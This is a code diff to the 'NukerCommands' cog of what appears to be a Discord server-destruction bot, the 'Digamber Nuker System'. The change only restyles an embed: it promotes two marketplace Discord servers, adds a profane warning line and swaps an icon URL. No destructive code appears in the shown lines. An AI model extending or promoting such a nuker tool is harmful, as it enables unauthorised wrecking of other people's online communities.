@@ -63,20 +63,36 @@ class NukerCommands(commands.Cog):
             )
             
             embed.add_field(
-                name="🔗 OFFICIAL SERVERS",
-                value="-# \n1. https://discord.gg/5TB2n6tmvd\n2. https://discord.gg/5bFnXdUp8U\n",
-                inline=False
-            )
+    name="🔗 OFFICIAL SERVER — Roy Seller",
+    value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
+          "**┃ 🔥 Join Roy Seller:**\n"
+          "**┃ https://discord.gg/5TB2n6tmvd**\n"
+          "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
+          "**✅ Trusted Marketplace**\n"
+          "**🚀 Fast Orders & Instant Support**",
+    inline=False
+)
+
+embed.add_field(
+    name="🔗 OFFICIAL SERVER — SM GrowMart HQ",
+    value="**╭─━━━━━━━━━━━━━━━━━━─╮**\n"
+          "**┃ ⚡ Join GrowMart HQ:**\n"
+          "**┃ https://discord.gg/5bFnXdUp8U**\n"
+          "**╰─━━━━━━━━━━━━━━━━━━─╯**\n\n"
+          "**🎯 Growth Tools & Services**\n"
+          "**💬 Direct Staff Assistance**",
+    inline=False
+)
             
             embed.add_field(
                 name="⚠️ WARNING",
-                value="This is an automated nuke system. Do not invite unauthorized bots.",
+                value="This is an Fucked by Digamber nuke system. Do not invite unauthorized bots.",
                 inline=False
             )
             
             embed.set_footer(
                 text="Digamber Nuker System • Maximum Speed Destruction",
-                icon_url="https://cdn.discordapp.com/emojis/1122334455667788993.png"
+                icon_url="https://i.ibb.co/r27XSnMB/Danger-ezgif-com-resize.gif"
             )
             
             embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1122334455667788991/1122334455667788994/warning.png")
